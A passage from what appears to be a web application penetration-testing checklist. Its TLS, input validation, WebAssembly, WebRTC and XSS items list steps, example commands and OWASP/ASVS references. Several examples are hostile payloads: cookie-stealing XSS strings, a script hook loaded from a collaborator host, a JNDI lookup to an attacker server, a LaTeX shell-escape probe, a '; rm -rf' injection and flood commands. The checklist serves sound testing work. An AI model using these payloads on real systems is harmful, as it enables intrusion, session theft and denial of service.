  *Refs:* wstg: WSTG-CRYP-01; asvs: V12.1.2; owasp_top10: A04:2025; cheatsheet: Transport_Layer_Security_Cheat_Sheet; cwe: CWE-326, CWE-327; capec: CAPEC-217

- [ ] **WEB-TLS-003** Make sure external services use valid, publicly trusted TLS certificates  
  *Severity if fail:* Medium | *Type:* Automated, Manual | *Level:* ASVS L1  
  *Objective:* Find expired, self-signed, wrong-host or chain-broken certificates on public services.  
  *Steps:*
  1. Get the certificate chain of each public host with openssl s_client or testssl.sh.
  2. Make sure the validity dates are current and the chain ends at a public CA.
  3. Make sure the Subject Alternative Name matches the host name.
  4. Make sure the certificate uses a SHA-256 or stronger signature and a strong key.
  5. Look for internal names or IP addresses in the Issuer and SAN fields.
  *Example:* `echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null | openssl x509 -noout -text | grep -E 'Not After|Subject Alternative|Signature Algorithm|Public-Key'; testssl.sh -S example.com`  
  *Expected:* All public services present valid certificates from a public CA, with matching SAN, SHA-256 or stronger signature, and no internal data.  
  *Refs:* wstg: WSTG-CRYP-01; asvs: V12.2.2; owasp_top10: A04:2025; cheatsheet: Transport_Layer_Security_Cheat_Sheet; cwe: CWE-295, CWE-296, CWE-297

- [ ] **WEB-TLS-004** Review certificate key strength, wildcard use and key protection  
  *Severity if fail:* Low | *Type:* Automated, Config Review  
  *Objective:* Find weak certificate keys, wide wildcard certificates and unprotected private keys.  
  *Steps:*
  1. Read the key type and size of each certificate.
  2. Make sure RSA keys are 3072 bits or more, or ECDSA uses P-256 or better.
  3. List the systems that share each wildcard certificate and check their trust levels.
  4. Check the file permissions and storage of the private key.
  5. Check certificate lifetime and automatic renewal, for example with ACME.
  *Example:* `testssl.sh -S example.com; ls -l /etc/ssl/private/; nmap --script ssl-cert -p443 example.com`  
  *Expected:* Keys are strong and protected. Wildcard certificates are not shared between systems of different trust levels.  
  *Refs:* wstg: WSTG-CRYP-01; owasp_top10: A04:2025; cheatsheet: Transport_Layer_Security_Cheat_Sheet; cwe: CWE-326, CWE-732

- [ ] **WEB-TLS-005** Make sure all connections use TLS with no clear-text fallback  
  *Severity if fail:* High | *Type:* Manual, Automated | *Level:* ASVS L1  
  *Objective:* Find cleartext HTTP, FTP or other services, and clients that fall back to clear text.  
  *Steps:*
  1. Try each application host on port 80 and other plain ports with curl.
  2. Look at the page source and traffic for http:// resources and mixed content.
  3. Try a downgrade: strip the TLS upgrade and request the HTTP URL of login and API paths.
  4. Make sure no sensitive request is accepted on HTTP, and cookies have the Secure flag.
  5. Check Basic authentication, login forms, password reset, change pages and payment pages.
  *Example:* `curl -si http://example.com/login; nmap -p 21,23,80,8080 example.com; mitmproxy --mode regular`  
  *Expected:* The services accept sensitive data only over TLS. No cleartext fallback and no mixed active content exist.  
  *Refs:* wstg: WSTG-CRYP-03, WSTG-CRYP-01; asvs: V12.2.1; owasp_top10: A04:2025; cheatsheet: Transport_Layer_Security_Cheat_Sheet; cwe: CWE-319, CWE-523; capec: CAPEC-157

- [ ] **WEB-TLS-006** Make sure no channel sends sensitive data in clear text  
  *Severity if fail:* High | *Type:* Manual, Code Review  
  *Objective:* Find credentials, session IDs and personal data that travel unencrypted or are stored in source and logs.  
  *Steps:*
  1. Capture traffic during login, password reset, profile edit and payment.
  2. Look for sensitive data in clear text in non-HTTP channels such as e-mail, FTP and SMTP.
  3. Search the source and log files for hard-coded passwords and personal data.
  4. Make sure the Secure flag is set on session cookies.
  *Example:* `tcpdump -i eth0 -A port 80 | grep -iE 'password|session'; grep -rEi 'password|pwd|secret' ./src`  
  *Expected:* The application sends sensitive data only over encrypted channels. No clear-text secrets exist in source or logs.  
  *Refs:* wstg: WSTG-CRYP-03, WSTG-ATHN-01; owasp_top10: A04:2025; cwe: CWE-319, CWE-532, CWE-798

- [ ] **WEB-TLS-007** Check Online Certificate Status Protocol stapling and revocation  
  *Severity if fail:* Low | *Type:* Automated, Config Review | *Level:* ASVS L3  
  *Objective:* Find servers that do not support certificate revocation checks.  
  *Steps:*
  1. Run openssl s_client with -status against the host.
  2. Look for an OCSP response in the output.
  3. Check that the certificate has OCSP or CRL information.
  4. Check that the server renews the staple.
  *Example:* `echo | openssl s_client -connect example.com:443 -status 2>/dev/null | grep -A5 'OCSP Response'; testssl.sh -S example.com`  
  *Expected:* The server staples a current OCSP response, or another revocation method is documented.  
  *Refs:* asvs: V12.1.4; cwe: CWE-299

- [ ] **WEB-TLS-008** Check that Encrypted Client Hello is enabled  
  *Severity if fail:* Info | *Type:* Manual, Config Review | *Level:* ASVS L3  
  *Objective:* Find TLS settings that expose the server name in clear text.  
  *Steps:*
  1. Query the DNS HTTPS record for an ech parameter.
  2. Test a TLS connection with an ECH-capable client.
  3. Check the server and CDN settings for ECH.
  *Example:* `dig +short HTTPS example.com; curl --ech true https://example.com/ -v`  
  *Expected:* ECH is enabled, or the owner has accepted the risk in writing.  
  *Refs:* asvs: V12.1.5

- [ ] **WEB-TLS-009** Make sure mTLS client certificates are validated before use  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find servers that accept untrusted or unchecked client certificates for identity.  
  *Steps:*
  1. Connect with no certificate and with a self-signed certificate.
  2. Connect with an expired certificate and a certificate from another CA.
  3. Connect with a revoked certificate if a test one exists.
  4. Check that the identity is taken only after chain validation.
  *Example:* `openssl s_client -connect example.com:443 -cert selfsigned.pem -key selfsigned.key; curl --cert client.pem --key client.key https://example.com/`  
  *Expected:* The server rejects client certificates that are untrusted, expired, revoked or from another CA.  
  *Refs:* asvs: V12.1.3; cwe: CWE-295

- [ ] **WEB-TLS-010** Make sure the application validates server certificates on outbound TLS  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find backend clients that disable certificate validation or use clear text to monitoring, databases and partners.  
  *Steps:*
  1. List all outbound connections: databases, queues, partner APIs, monitoring, SSH and management tools.
  2. Search the code for switches that turn off certificate checks, such as InsecureSkipVerify and TrustAllCerts.
  3. Put a proxy with a self-signed certificate in front of one outbound call.
  4. Look at whether the call fails and the failure is logged.
  5. Make sure no outbound connection falls back to clear text.
  *Example:* `grep -rEn 'verify\s*=\s*False|InsecureSkipVerify|rejectUnauthorized:\s*false|TrustAll' ./src; mitmproxy --mode reverse:https://partner.example`  
  *Expected:* All outbound connections use TLS and reject invalid certificates. The failure is logged and there is no fallback to clear text.  
  *Refs:* asvs: V12.3.1, V12.3.2; owasp_top10: A04:2025; cheatsheet: Transport_Layer_Security_Cheat_Sheet; cwe: CWE-295, CWE-297, CWE-319

- [ ] **WEB-TLS-011** Check TLS, trust and authentication between internal services  
  *Severity if fail:* Medium | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find internal HTTP services that use clear text, untrusted certificates or no service authentication.  
  *Steps:*
  1. Map internal HTTP service calls in the architecture documents.
  2. Capture traffic between two internal services and look for clear text.
  3. Check which CA each service trusts. Self-signed use must be pinned to specific CAs.
  4. Call an internal service from another host without a client certificate.
  *Example:* `tcpdump -i any -A 'port 8080 and host 10.0.0.5'; openssl s_client -connect svc.internal:8443 -showcerts`  
  *Expected:* Internal service traffic uses TLS with trusted certificates. Services use strong mutual authentication.  
  *Refs:* asvs: V12.3.3, V12.3.4, V12.3.5; owasp_top10: A04:2025; cwe: CWE-319, CWE-295, CWE-306


## VAL

- [ ] **WEB-VAL-001** Test LaTeX processing for command injection  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds LaTeX rendering features that run with shell escape enabled or accept unrestricted commands.  
  *Steps:*
  1. Find a feature that renders user-supplied LaTeX, such as a math editor or document export.
  2. Submit a LaTeX command that would call the shell if shell-escape is enabled.
  3. Submit a command outside the documented allowlist and confirm it is rejected.
  *Example:* `\write18{id} payload, which only runs if pdflatex is called with --shell-escape`  
  *Expected:* LaTeX is rendered without the shell-escape flag and only an allowlist of safe commands is permitted.  
  *Refs:* asvs: V1.2.8; cwe: CWE-94; capec: CAPEC-242

- [ ] **WEB-VAL-002** Test potentially dangerous input sinks for length and character limits  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds sinks that accept oversized or unrestricted character input before passing it to a risky context.  
  *Steps:*
  1. Identify a sink that forwards input to a risky context, such as a shell, template or report engine.
  2. Submit an input far longer than the field appears to allow.
  3. Submit input containing characters outside the expected character class for that field.
  *Example:* `Submit a 100000-character string, and a field expecting digits with input such as '<script>' or '; rm -rf'`  
  *Expected:* The sink enforces an explicit length limit and an allowlist of safe characters before use.  
  *Refs:* asvs: V1.3.3; cwe: CWE-20, CWE-1284

- [ ] **WEB-VAL-003** Test JNDI lookup parameters for JNDI injection  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds application code that builds a JNDI name or lookup from untrusted input.  
  *Steps:*
  1. Find inputs that influence a JNDI lookup name, such as a datasource or LDAP resource identifier.
  2. Submit a JNDI URI pointing to an attacker-controlled LDAP or RMI server.
  3. Confirm whether the application attempts to connect to the attacker server from the lookup.
  *Example:* `Submit ldap://collaborator-host/a as the JNDI lookup name and watch for an outbound connection`  
  *Expected:* JNDI lookups are restricted to a fixed, trusted set of names and remote codebases are disabled.  
  *Refs:* asvs: V1.3.8; cwe: CWE-74; capec: CAPEC-242

- [ ] **WEB-VAL-004** Test memcache key and value input for injection  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds data sent to a memcache server that is not sanitized against protocol injection.  
  *Steps:*
  1. Find inputs that are stored in or used as a key for a memcache lookup.
  2. Submit memcache protocol control characters, such as a carriage return and line feed, in the input.
  3. Observe whether the memcache protocol is disrupted or a second command is injected.
  *Example:* `Memcache key probe containing \r\n followed by a second protocol command`  
  *Expected:* Input sent to memcache is sanitized of protocol control characters before being used as a key or value.  
  *Refs:* asvs: V1.3.9; cwe: CWE-93

- [ ] **WEB-VAL-005** Test memory-unsafe native components for overflow conditions  
  *Severity if fail:* Critical | *Type:* Code Review | *Level:* ASVS L2  
  *Objective:* Finds native code components that lack memory-safe string and pointer handling.  
  *Steps:*
  1. Identify any native, C or C++ component that processes untrusted input, such as an image or document parser.
  2. Submit oversized and boundary-length input to the native component.
  3. Review build flags and source for memory-safe string functions and bounds checks.
  *Example:* `Fuzz the native parser with AFL or a long crafted file and monitor for a crash or ASAN report`  
  *Expected:* Native components use memory-safe string and pointer functions and reject input causing an overflow.  
  *Refs:* asvs: V1.4.1; cwe: CWE-119, CWE-787, CWE-120, CWE-121, CWE-122, CWE-125; capec: CAPEC-100; wstg: WSTG-INJT-13

- [ ] **WEB-VAL-006** Test numeric input handling for integer overflow  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds numeric fields that wrap or overflow instead of rejecting out-of-range values.  
  *Steps:*
  1. Find numeric input fields that affect business logic, such as quantity or amount.
  2. Submit a value at the boundary of the integer type, such as 2147483647 plus one.
  3. Submit a negative value where only positive values should be allowed.
  4. Observe whether the stored or displayed result wraps to an unexpected value.
  *Example:* `quantity=2147483648 ; quantity=-1 ; amount=9999999999999999999`  
  *Expected:* Numeric input is range- and sign-checked server-side and rejected before it can overflow or wrap.  
  *Refs:* asvs: V1.4.2; cwe: CWE-190; capec: CAPEC-128

- [ ] **WEB-VAL-007** Test resource cleanup for use-after-free and dangling references  
  *Severity if fail:* Critical | *Type:* Code Review | *Level:* ASVS L2  
  *Objective:* Finds native components that fail to null out freed pointers, risking use-after-free exploitation.  
  *Steps:*
  1. Identify a native component that allocates and frees memory for each request.
  2. Send concurrent or malformed requests designed to trigger an early free followed by reuse.
  3. Monitor for a crash or memory corruption using a sanitizer build.
  *Example:* `Run the native component under AddressSanitizer while sending malformed and concurrent requests`  
  *Expected:* Freed memory and pointers are set to null or removed immediately, and no use-after-free is observed under a sanitizer.  
  *Refs:* asvs: V1.4.3; cwe: CWE-416

- [ ] **WEB-VAL-008** Test multiple parsers for consistent interpretation of the same input  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds mismatched JSON, XML or URL parsing between components that attackers can exploit.  
  *Steps:*
  1. Identify where the same raw input, such as a URL or JSON document, is parsed by more than one component.
  2. Submit an input with an ambiguous encoding, such as a duplicate key or an unusual Unicode form.
  3. Compare how each parser interprets the value and look for a disagreement that bypasses a security check.
  *Example:* `Duplicate JSON key {"user":"admin","user":"guest"} parsed differently by the front-end proxy and the backend; URL with %2e%2e%2f parsed differently by two components`  
  *Expected:* All components that parse the same data use the same library, configuration and character encoding so interpretation never diverges.  
  *Refs:* asvs: V1.5.3; cwe: CWE-436; capec: CAPEC-267

- [ ] **WEB-VAL-009** Review input validation documentation for defined data formats  
  *Severity if fail:* Info | *Type:* Config Review | *Level:* ASVS L1  
  *Objective:* Confirms the application documents expected data formats for structured input fields.  
  *Steps:*
  1. Request the application design or API documentation.
  2. Check whether input validation rules are documented for common data formats such as email, phone or credit card.
  3. Check whether an internal data format used by the application is documented with its validation rule.
  *Example:* `Review API specification or developer wiki for a documented validation rule per field`  
  *Expected:* Documentation defines the validation rule for every structured input field, including common and internal formats.  
  *Refs:* asvs: V2.1.1

- [ ] **WEB-VAL-010** Review documentation for cross-field logical consistency rules  
  *Severity if fail:* Info | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Confirms the application documents how related fields must be consistent with each other.  
  *Steps:*
  1. Request the application design documentation for fields that must be logically related, such as suburb and postal code.
  2. Check whether the documentation defines the expected relationship and the validation rule applied.
  *Example:* `Review documentation for a rule such as "postal code must match the selected suburb"`  
  *Expected:* Documentation defines the logical and contextual consistency rule for every related group of input fields.  
  *Refs:* asvs: V2.1.2

- [ ] **WEB-VAL-011** Review documentation for business logic limits  
  *Severity if fail:* Info | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Confirms per-user and global business logic limits are documented before they are tested.  
  *Steps:*
  1. Request the application design documentation for business logic limits, such as maximum order size or rate limits.
  2. Check whether both per-user and global limits are defined for each relevant function.
  *Example:* `Review documentation for a stated per-user and global limit on a function, such as daily transfer amount`  
  *Expected:* Documentation defines both per-user and global business logic limits for every relevant function.  
  *Refs:* asvs: V2.1.3

- [ ] **WEB-VAL-012** Test business-critical input against positive allowlist validation  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds business- or security-decision input validated only by a blocklist instead of a positive allowlist.  
  *Steps:*
  1. Identify an input used to make a business or security decision, such as a discount code or role selection.
  2. Submit a value outside the documented allowlist of values, patterns or ranges.
  3. Submit a value that a blocklist filter was not designed to catch, such as an unexpected encoding.
  *Example:* `role=superadmin where only user and manager are valid roles; discount=%00OVERRIDE`  
  *Expected:* The input is checked with positive allowlist validation against documented values, patterns or ranges, not a blocklist.  
  *Refs:* owasp_top10: A06:2025; wstg: WSTG-BUSL-01; asvs: V2.2.1; cheatsheet: Input_Validation_Cheat_Sheet; cwe: CWE-20, CWE-184; capec: CAPEC-137

- [ ] **WEB-VAL-013** Test that client-side validation is enforced again server-side  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds input validation that exists only in client-side JavaScript and can be bypassed with a direct request.  
  *Steps:*
  1. Identify a field with client-side validation, such as a maximum length or regex pattern.
  2. Disable JavaScript or use a proxy to submit a request that violates the client-side rule directly to the server.
  3. Observe whether the server accepts the value that the client would have rejected.
  *Example:* `Burp Repeater: resend the request with an out-of-range or malformed value, bypassing the browser form entirely`  
  *Expected:* The server enforces the same validation rule independently of the client, rejecting the bypassed value.  
  *Refs:* wstg: WSTG-BUSL-01; asvs: V2.2.2; cheatsheet: Input_Validation_Cheat_Sheet; cwe: CWE-602; capec: CAPEC-137

- [ ] **WEB-VAL-014** Test related input fields for combined-value consistency  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds endpoints that accept individually valid fields whose combination is logically inconsistent.  
  *Steps:*
  1. Identify fields whose combination must be logically consistent, such as a start date and an end date.
  2. Submit a combination that is individually valid for each field but inconsistent together.
  3. Observe whether the application accepts or rejects the inconsistent combination.
  *Example:* `start_date=2026-05-01&end_date=2026-01-01 ; discount=50&subtotal=10 making the discount exceed the subtotal`  
  *Expected:* The server validates that combinations of related fields are logically consistent and rejects the inconsistent request.  
  *Refs:* wstg: WSTG-BUSL-01; asvs: V2.2.3; cheatsheet: Business_Logic_Security_Cheat_Sheet; cwe: CWE-1288


## WASM

- [ ] **WEB-WASM-001** Find WebAssembly modules, debug artifacts and embedded endpoints  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Find Wasm modules, source maps, DWARF data and embedded URLs or secrets that leak implementation details.  
  *Steps:*
  1. Open the Network tab, use the Wasm filter, and reload the application.
  2. Search the JavaScript for WebAssembly.instantiate, compile and new WebAssembly.Module.
  3. Look for embedded modules: long Base64 strings, data: URIs and files with other extensions.
  4. Check files for the magic bytes 00 61 73 6d.
  5. List imports, exports, custom sections (name, DWARF) and source map links.
  6. Extract strings for URLs, API endpoints and keys.
  *Example:* `wasm-objdump -x module.wasm | head -50; strings -n 8 module.wasm | grep -iE 'http|key|token'; od -An -tx1 -N8 module.bin; wasm-tools print module.wasm`  
  *Expected:* No debug information, source maps or secrets are in production modules. The tester has a list of all modules.  
  *Refs:* wstg: WSTG-WASM-01; cwe: CWE-540, CWE-200; capec: CAPEC-188


## WEBRTC

- [ ] **WEB-WEBRTC-001** Make sure the TURN service blocks reserved and internal addresses  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find TURN relays that forward traffic to internal, loopback or broadcast addresses.  
  *Steps:*
  1. Get TURN credentials from the application.
  2. Ask the TURN server to relay to loopback, link-local, private and broadcast IPv4 and IPv6 addresses.
  3. Look at whether the allocation or permission is refused.
  4. Review the TURN configuration for denied peer address ranges.
  *Example:* `turnutils_uclient -u user -w pass -p 3478 -e 127.0.0.1 turn.example.com; nmap -sU -p3478 --script stun-info turn.example.com`  
  *Expected:* The TURN server refuses relay to reserved address ranges for IPv4 and IPv6.  
  *Refs:* asvs: V17.1.1; cwe: CWE-918

- [ ] **WEB-WEBRTC-002** Make sure the TURN service resists resource exhaustion  
  *Severity if fail:* Medium | *Type:* Manual, Config Review | *Level:* ASVS L3  
  *Objective:* Find TURN servers where one user can open very many ports and exhaust the server.  
  *Steps:*
  1. Open allocations with one account until the server refuses.
  2. Check per-user quotas and total port limits in the configuration.
  3. Check that normal users still get allocations during the test.
  *Example:* `turnutils_uclient -u user -w pass -m 500 -n 1000 turn.example.com`  
  *Expected:* Per-user allocation limits exist and normal users keep service.  
  *Refs:* asvs: V17.1.2; cwe: CWE-770; capec: CAPEC-125

- [ ] **WEB-WEBRTC-003** Make sure the DTLS certificate key is managed by the key policy  
  *Severity if fail:* Medium | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Find DTLS keys that are unmanaged, shared or never rotated.  
  *Steps:*
  1. Find the DTLS certificate and key of the media server.
  2. Check where the key is stored and who can read it.
  3. Compare handling and rotation with the key management policy.
  *Example:* `openssl x509 -in dtls-cert.pem -noout -dates -fingerprint; ls -l /etc/media/dtls/`  
  *Expected:* The DTLS key follows the documented key management policy, with protected storage and rotation.  
  *Refs:* asvs: V17.2.1; cheatsheet: Key_Management_Cheat_Sheet; cwe: CWE-321

- [ ] **WEB-WEBRTC-004** Check DTLS cipher suites and the SRTP protection profile  
  *Severity if fail:* Medium | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find weak DTLS cipher suites or SRTP profiles at the media server.  
  *Steps:*
  1. Start a call and capture the DTLS handshake.
  2. Read the negotiated cipher suite and the DTLS-SRTP protection profile.
  3. Try a handshake with weak suites and null profiles.
  4. Compare with the approved list.
  *Example:* `Wireshark filter 'dtls.handshake'; sslyze or openssl s_client -dtls1_2 -connect media.example.com:5004 -use_srtp SRTP_AES128_CM_SHA1_80`  
  *Expected:* Only approved DTLS cipher suites and strong SRTP protection profiles are accepted.  
  *Refs:* asvs: V17.2.2; cwe: CWE-327

- [ ] **WEB-WEBRTC-005** Make sure the media server checks SRTP authentication  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find media servers that accept injected RTP packets.  
  *Steps:*
  1. Join a call as a test client.
  2. Send forged RTP and SRTP packets with a wrong auth tag into the stream.
  3. Check whether the server drops them and the media stays clean.
  *Example:* `scapy script that sends RTP to the media port; compare audio output`  
  *Expected:* The server drops packets that fail SRTP authentication. No media is inserted and no denial of service occurs.  
  *Refs:* asvs: V17.2.3; cwe: CWE-345

- [ ] **WEB-WEBRTC-006** Make sure the media server survives malformed SRTP packets  
  *Severity if fail:* High | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find media servers that crash or stall on malformed SRTP packets.  
  *Steps:*
  1. Fuzz SRTP and RTP packets towards the media port with test tools.
  2. Watch the server process, CPU and memory.
  3. Check that other calls continue.
  *Example:* `boofuzz SRTP template against media.example.com; monitor with top`  
  *Expected:* The server ignores malformed packets and keeps processing legitimate media.  
  *Refs:* asvs: V17.2.4; cwe: CWE-20, CWE-248

- [ ] **WEB-WEBRTC-007** Make sure the media server and recording survive SRTP floods  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Find media servers and recording services that fail under floods from legitimate users.  
  *Steps:*
  1. Create a flood of valid SRTP traffic from many test clients.
  2. Check that existing calls and the recording process keep working.
  3. Check limits per client.
  *Example:* `WebRTC load test tool that opens 200 test clients`  
  *Expected:* Media processing and recording continue during floods from legitimate users.  
  *Refs:* asvs: V17.2.5, V17.2.7; cwe: CWE-400; capec: CAPEC-125

- [ ] **WEB-WEBRTC-008** Check the media server for the DTLS ClientHello race condition  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Find media servers that are vulnerable to the DTLS ClientHello race condition.  
  *Steps:*
  1. Find the media server product and version.
  2. Check vendor advisories for the DTLS ClientHello race condition.
  3. If no advisory clears it, run the race test with two parallel ClientHello messages in a test system.
  *Example:* `Review the CVE list for the media stack; custom script that sends two ClientHello messages in parallel`  
  *Expected:* The server is patched for the known issue or the race test shows no failure.  
  *Refs:* asvs: V17.2.6; owasp_top10: A03:2025; cwe: CWE-362

- [ ] **WEB-WEBRTC-009** Make sure the DTLS certificate matches the SDP fingerprint  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Find clients and servers that accept DTLS certificates that do not match the SDP fingerprint.  
  *Steps:*
  1. Intercept the signaling and change the a=fingerprint line in the SDP.
  2. Start the call.
  3. Check that the media stream ends.
  *Example:* `Intercept the SDP in the signaling WebSocket with Burp and change the a=fingerprint value`  
  *Expected:* The media stream ends when the DTLS certificate does not match the SDP fingerprint.  
  *Refs:* asvs: V17.2.8; cwe: CWE-295, CWE-345

- [ ] **WEB-WEBRTC-010** Check signaling server rate limits against floods  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find signaling servers that fail during message floods.  
  *Steps:*
  1. Send a flood of signaling messages from one test client.
  2. Check that the server limits the client and keeps serving others.
  3. Check the rate limit setting at the signaling level.
  *Example:* `wscat loop or k6 websocket script sending 10000 messages per second to wss://example.com/signal`  
  *Expected:* Signaling rate limits stop the flood, and legitimate messages continue.  
  *Refs:* asvs: V17.3.1; cwe: CWE-770, CWE-799; capec: CAPEC-125

- [ ] **WEB-WEBRTC-011** Make sure the signaling server handles malformed messages safely  
  *Severity if fail:* High | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find signaling servers that crash on malformed messages, integer overflows or large fields.  
  *Steps:*
  1. Send malformed JSON or SDP, very long fields, and extreme numbers to the signaling endpoint.
  2. Watch the server process and logs.
  3. Check that other sessions are not affected.
  *Example:* `boofuzz or a custom fuzzer for the signaling protocol; Burp WebSocket Repeater with oversized fields`  
  *Expected:* The server rejects malformed messages with input validation. It does not crash or stall.  
  *Refs:* asvs: V17.3.2; cwe: CWE-20, CWE-190, CWE-248


## XSS

- [ ] **WEB-XSS-001** Test reflected input for cross-site scripting  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds input that is echoed back in the response without context-aware encoding.  
  *Steps:*
  1. List every input that is reflected in the HTML response, including headers and hidden fields.
  2. Submit a basic script payload in each input and view the rendered page source.
  3. If the basic payload is blocked, try case variation, broken tags and non-recursive filter bypass payloads.
  4. Confirm execution with a popup or a network call to a collector host.
  *Example:* `<script>alert(123)</script> ; "><script>alert(document.cookie)</script> ; <ScRiPt>alert(1)</ScRiPt> ; <scr<script>ipt>alert(1)</script>`  
  *Expected:* The response HTML-encodes or JavaScript-escapes the reflected value for its context, so no script executes.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-INJT-01; asvs: V1.1.1, V1.1.2, V1.2.1; cheatsheet: Cross_Site_Scripting_Prevention_Cheat_Sheet; cwe: CWE-79, CWE-80, CWE-87; capec: CAPEC-63, CAPEC-591

- [ ] **WEB-XSS-002** Test stored input fields for persistent cross-site scripting  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds user content that is stored and later rendered without encoding to other users.  
  *Steps:*
  1. Identify fields that persist to a data store, such as a profile, comment or support ticket.
  2. Submit a script payload in the field and save it.
  3. Reload the page as the same user and as another user, including a higher-privilege user.
  4. If the payload is uploaded as a file, upload an HTML or SVG file and request it directly.
  *Example:* `aaa@aa.com"><script>alert(document.cookie)</script> ; stored hook: "><script src=https://collaborator-host/hook.js></script>`  
  *Expected:* Stored content is HTML-encoded on output for every viewer, and uploaded HTML or SVG files do not execute as script.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-INJT-02; asvs: V1.1.1, V1.1.2, V1.2.1; cheatsheet: Cross_Site_Scripting_Prevention_Cheat_Sheet; cwe: CWE-79; capec: CAPEC-63, CAPEC-592

- [ ] **WEB-XSS-003** Test HTML sanitization of rich text and WYSIWYG input  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds HTML sanitizers that fail to strip dangerous tags, attributes or SVG script content.  
  *Steps:*
  1. Find a feature that accepts rich HTML input, such as a WYSIWYG editor or markdown renderer.
  2. Submit script tags, event handler attributes and an SVG element with embedded script.
  3. Submit CSS, Markdown or template syntax that the renderer may evaluate as an expression.
  4. Compare the stored output against the sanitizer allowlist and confirm it rejects dangerous content.
  *Example:* `<img src=x onerror=alert(1)> ; <svg onload=alert(1)><foreignObject><script>alert(1)</script></foreignObject></svg> ; Markdown/CSS/XSL expression payloads`  
  *Expected:* The sanitizer strips scripts, event handlers and dangerous SVG elements, keeping only an explicit allowlist of tags and attributes.  
  *Refs:* asvs: V1.3.1, V1.3.4, V1.3.5; cheatsheet: Cross_Site_Scripting_Prevention_Cheat_Sheet; cwe: CWE-79, CWE-80; capec: CAPEC-63

- [ ] **WEB-XSS-004** Test URL, JavaScript and CSS output contexts for correct encoding  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds output encoding that is missing or wrong for the URL, JavaScript, CSS or HTTP header context.  
  *Steps:*
  1. Find a value placed into a URL attribute, a JavaScript variable, a CSS value and an HTTP header.
  2. Submit a context-breaking payload for each context, for example a quote for JavaScript or a URL scheme.
  3. Check if the javascript: or data: scheme is accepted in a URL attribute.
  4. Confirm each context applies the matching encoder before use.
  *Example:* `URL context: javascript:alert(1) in href ; JS context: ';alert(1);' ; CSS context: expression(alert(1)) or url(javascript:alert(1))`  
  *Expected:* Each context uses its matching encoder, and javascript: and data: schemes are rejected for navigable URLs.  
  *Refs:* asvs: V1.2.2, V1.2.3; cheatsheet: Cross_Site_Scripting_Prevention_Cheat_Sheet; cwe: CWE-79, CWE-83, CWE-84; capec: CAPEC-63, CAPEC-18

- [ ] **WEB-XSS-005** Test regular expressions and dynamic code features for injection and ReDoS  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds unescaped use of regular expression metacharacters and catastrophic backtracking patterns.  
  *Steps:*
  1. Find inputs used to build a regular expression or passed to eval or a template expression language.
  2. Submit regex metacharacters to confirm they are escaped before being used.
  3. Submit a pattern crafted for exponential backtracking and measure response time.
  4. Confirm the application does not call eval or Spring Expression Language on the input.
  *Example:* `Regex metachar probe: .*+ ; ReDoS payload: (a+)+$  followed by 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!' ; eval probe: 7*7`  
  *Expected:* Regex metacharacters in user input are escaped, vulnerable patterns are avoided, and eval is never called on user input.  
  *Refs:* asvs: V1.2.9, V1.3.2, V1.3.12; cwe: CWE-1333, CWE-95; capec: CAPEC-242

- [ ] **WEB-XSS-006** Test DOM sinks for DOM-based cross-site scripting  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds client-side JavaScript that writes an untrusted source into a dangerous DOM sink.  
  *Steps:*
  1. Review client-side JavaScript for sources such as location.hash, location.search and document.referrer.
  2. Trace each source to its sink, for example innerHTML, document.write or eval.
  3. Craft a payload in the URL fragment or query string that reaches the sink.
  4. Load the crafted URL and confirm script execution in the browser.
  *Example:* `https://target/page#<script>alert(1)</script> ; https://target/?user=<img src=x onerror=alert(1)>`  
  *Expected:* Untrusted sources are written only through safe sinks such as textContent, or are sanitized before reaching innerHTML or eval-like sinks.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-CLNT-01; asvs: V3.2.2; cheatsheet: DOM_based_XSS_Prevention_Cheat_Sheet; cwe: CWE-79; capec: CAPEC-588

- [ ] **WEB-XSS-007** Test self-triggered DOM XSS requiring a pasted payload  
  *Severity if fail:* Low | *Type:* Manual  
